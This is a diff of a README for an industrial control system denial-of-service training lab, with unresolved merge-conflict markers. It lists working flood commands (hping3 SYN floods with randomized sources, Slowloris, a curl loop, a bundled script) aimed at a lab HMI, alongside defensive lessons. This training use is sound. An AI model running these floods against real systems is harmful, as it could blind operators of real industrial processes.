@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 # Industrial Control System DoS Training Lab
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
@@ -102,41 +103,71 @@ http://localhost:5000
 
 ### Scenario 2: DoS Attack Simulation
 
-**Setup**: Kali Linux machine on the same network as the Windows VM running the HMI.
+**Setup**: Attack machine on the same network as the Windows VM running the HMI.
 
-#### Using hping3 (SYN Flood)
+#### Method 1: Using Included Python Script (Recommended)
 
 ```bash
-# Install hping3 on Kali
-sudo apt-get install hping3
+# From any machine with Python
+python dos_attack.py <WINDOWS_VM_IP>
 
-# Launch SYN flood attack
-sudo hping3 -S --flood -p 5000 <WINDOWS_VM_IP>
+# Or from the same machine
+python dos_attack.py localhost
 ```
 
-#### Using Slowloris
+#### Method 2: Using hping3 (Kali Linux)
+
+```bash
+# Install hping3
+sudo apt-get install hping3
+
+# Multiple attack vectors
+sudo hping3 -S --flood -p 5000 <WINDOWS_VM_IP>  # SYN flood
+sudo hping3 --flood --rand-source -p 5000 <WINDOWS_VM_IP>  # Randomized source
+```
+
+#### Method 3: Using Slowloris
 
 ```bash
 # Install slowloris
 git clone https://github.com/gkbrk/slowloris.git
 cd slowloris
 
-# Launch slowloris attack
-python3 slowloris.py <WINDOWS_VM_IP> -p 5000
+# Launch attack with high socket count
+python3 slowloris.py <WINDOWS_VM_IP> -p 5000 -s 200
+```
+
+#### Method 4: Using curl (Simple HTTP Flood)
+
+```bash
+# Bash loop for HTTP flooding
+while true; do curl http://<WINDOWS_VM_IP>:5000/api/data & done
 ```
 
 #### Expected Results
 
 - ✅ **PLC continues running** on port 5020
 - ❌ **HMI becomes unresponsive** (port 5000 flooded)
+- ❌ **Web UI freezes or shows connection errors**
 - ❌ **Operator loses visibility** into the process
 - ⚠️ **Tank continues to operate** based on last commands
+- 📊 **Browser console shows failed API requests**
+
+#### Observing the Attack
+
+1. Open browser developer tools (F12)
+2. Go to Network tab
+3. Start the DoS attack
+4. Watch API requests fail with timeouts
+5. HMI graphics freeze/lag significantly
+6. PLC terminal shows continued operation
 
 This demonstrates the critical importance of:
 - Network segmentation
-- Rate limiting
+- Rate limiting and connection throttling
 - Intrusion detection systems
 - Redundant monitoring paths
+- Load balancing and failover mechanisms
 
 ## 📡 API Reference
 
@@ -245,3 +276,7 @@ For questions or feedback, please open an issue on GitHub.
 ---
 
 **Educational Use Only** | **Not for Production Environments**
+=======
+# ICS_DoS_lab
+ICS DoS Training Lab
+>>>>>>> 2e8480a91bc8a194b6c6b3221e9a72d2820cb51a
